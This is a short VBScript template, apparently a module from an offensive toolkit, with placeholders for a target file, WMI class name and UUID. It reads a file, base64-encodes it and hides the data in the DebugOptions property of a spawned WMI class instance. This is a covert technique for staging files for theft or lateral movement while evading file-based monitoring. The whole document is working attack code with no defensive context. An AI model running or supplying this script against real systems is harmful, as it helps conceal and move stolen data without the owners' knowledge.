inputFile = "REPLACE_WITH_TARGET_FILE"

Set inStream = CreateObject("ADODB.Stream")
inStream.Open
inStream.type= 1 'TypeBinary
inStream.LoadFromFile(inputFile)
readBytes = inStream.Read()
  
Set oXML = CreateObject("Msxml2.DOMDocument")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.nodeTypedValue = readBytes
Base64Encode = oNode.text

wbemCimtypeString = 8
Set objSWbemService = GetObject("Winmgmts:root\cimv2")
Set objClass = objSWbemService.Get("REPLACE_WITH_CLASSNAME")

Set objInstance = objClass.spawninstance_
objInstance.CreationClassName = "RELEACE_WITH_UUID"
objInstance.DebugOptions = Base64Encode
objInstance.put_